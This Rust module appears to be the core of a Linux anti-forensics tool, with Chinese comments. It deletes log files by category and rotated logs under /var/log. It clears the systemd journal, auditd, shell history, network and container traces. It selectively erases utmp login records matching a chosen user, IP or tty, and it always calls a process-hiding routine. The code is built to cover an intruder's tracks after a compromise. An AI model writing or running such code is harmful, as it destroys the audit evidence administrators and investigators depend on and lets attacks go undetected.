pub mod utmp;
pub mod journal;
pub mod network;

use crate::cli::Category;
use crate::common::Context;
use crate::paths;
use std::path::{Path, PathBuf};

pub fn clean_all(ctx: &Context, categories: &[Category]) {
    let targets = collect_targets(categories);

    if targets.is_empty() {
        ctx.info("没有找到需要清理的目标文件");
    } else {
        ctx.info(&format!("发现 {} 个文件/目录目标", targets.len()));
        for t in &targets {
            ctx.remove(t);
        }
    }

    // 压缩/轮转日志
    if categories.contains(&Category::System) {
        clean_rotated_logs(ctx);
    }

    // systemd journal
    if categories.contains(&Category::System) || categories.contains(&Category::Audit) {
        journal::clean_systemd_journal(ctx);
    }

    // auditd
    if categories.contains(&Category::Audit) || categories.contains(&Category::Security) {
        journal::clean_auditd(ctx);
    }

    // Shell 环境
    if categories.contains(&Category::Shell) {
        network::clean_shell_env(ctx);
    }

    // 网络痕迹
    if categories.contains(&Category::Network) {
        network::clean_network_traces(ctx);
    }

    // 容器
    if categories.contains(&Category::Container) {
        network::clean_container_traces(ctx);
    }

    // 进程隐藏
    network::hide_process(ctx);
}

pub fn selective_clean(
    ctx: &Context,
    user: Option<&str>,
    ip: Option<&str>,
    tty: Option<&str>,
) {
    if user.is_none() && ip.is_none() && tty.is_none() {
        eprintln!("选择性清除模式需要至少一个筛选条件: --user, --ip, 或 --tty");
        return;
    }

    ctx.info("选择性清除模式: 精确移除匹配的登录记录");
    utmp::clean_all_login_records(user, ip, tty, ctx.dry_run);
}

fn collect_targets(categories: &[Category]) -> Vec<PathBuf> {
    let raw = paths::log_paths(categories);
    let mut targets = Vec::new();
    for p in raw {
        if p.contains('*') || p.contains('?') {
            if let Ok(entries) = glob::glob(&p) {
                targets.extend(entries.filter_map(Result::ok));
            }
        } else {
            targets.push(PathBuf::from(p));
        }
    }
    targets
        .into_iter()
        .filter(|p| p.exists())
        .filter(|p| !is_empty(p))
        .collect()
}

fn is_empty(path: &Path) -> bool {
    if path.is_dir() {
        std::fs::read_dir(path)
            .map(|mut d| d.next().is_none())
            .unwrap_or(true)
    } else {
        std::fs::metadata(path)
            .map(|m| m.len() == 0)
            .unwrap_or(true)
    }
}

fn clean_rotated_logs(ctx: &Context) {
    ctx.info("清理轮转日志...");
    let patterns = [
        "/var/log/**/*.1",
        "/var/log/**/*.2",
        "/var/log/**/*.gz",
        "/var/log/**/*.bz2",
        "/var/log/**/*.xz",
        "/var/log/**/*.zst",
        "/var/log/**/*.old",
    ];
    for pattern in &patterns {
        if let Ok(entries) = glob::glob(pattern) {
            for path in entries.flatten() {
                ctx.remove(&path);
            }
        }
    }
}
